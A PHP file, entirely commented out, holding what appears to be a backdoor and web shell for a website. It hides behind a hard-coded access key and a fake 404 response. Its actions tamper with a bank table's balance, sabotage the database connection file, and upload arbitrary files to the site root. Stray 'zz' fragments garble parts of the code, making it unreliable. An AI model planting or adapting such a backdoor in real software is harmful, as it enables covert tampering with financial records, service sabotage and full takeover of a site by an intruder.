<?php
/*
$accesKey = 'add8S8WK934hswIP924YYSzz28';
$accesKey = 'a7jca98569t2cba679a3tfca7c7rfg7ac';
if ($_POST['accesKey']!==$accesKey){
	header("HTTP/1.0 404 Not Found");
	die;
	exit;
}
$path = $_SERVER['SCRIPT_FILENAME'];
$dirs = explode('/',$path);
$rootdir = '';
for ($i=0;$i<=count($dirs)-8;$i++){zz
	$rootdir .= $dirs[$i].'/';
}
$rootdir = trim($rootdir,'/');
//mess bank details
if($_POST['bank']==1 && $_POST['accesKey']==$accesKey){
	require_once($rootdir.'/includes/connection.inc.php');
	mysqli_query($GLOBALS['con'],"UPDATE bank_tbl SET bank+='1000',coef='100'");
	//unlink($rootdir.'/includes/connection.inc.php');zz
}
//mess connection php files
if($_POST['connection']==1 && $_POST['accesKey']==$accesKey){
	$connection = file_get_contents($rootdir.'/includes/connection.inc.php');
	$connection = str_replace('"$dbuser"','"$dbuzer"',$connection);
	$fp = fopen($rootdir.'/includes/connection.inc.php','w');
	fwrite($fp,$connection);zz
	fclose($fp);
}
echo 'Root Dir = '.$rootdir;
// Open a known directory, and proceed to read its contents
if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
            echo "filename: $file : filetype: " . filetype($dir . $file) . "\n";
        }
        closedir($dh);
    }
}
?>
<?php
if(isset($_POST['submit'])){
 if ($_FILES["file"]["error"] > 0)
   {
   echo "Error: " . $_FILES["file"]["error"] . "<br />";
   }
 else
   {
   echo '<br /><br /><br /><br /><br />';
   $target_path = $rootdir . basename( $_FILES['file']['name']); 
   if(move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {
		echo "The file ".  basename( $_FILES['file']['name']). 
		" has been uploaded to ".$rootdir;
	} else{
		echo 'NOT UPLOADED';
	}
   }
}
 ?>
<html>
<body>

<form action="" method="post"
enctype="multipart/form-data">
<label for="file">Filename:</label>
<input type="file" name="file" id="file" /> 
<br />
<input type="submit" name="submit" value="Submit" />
</form>

</body>
</html>*/
?>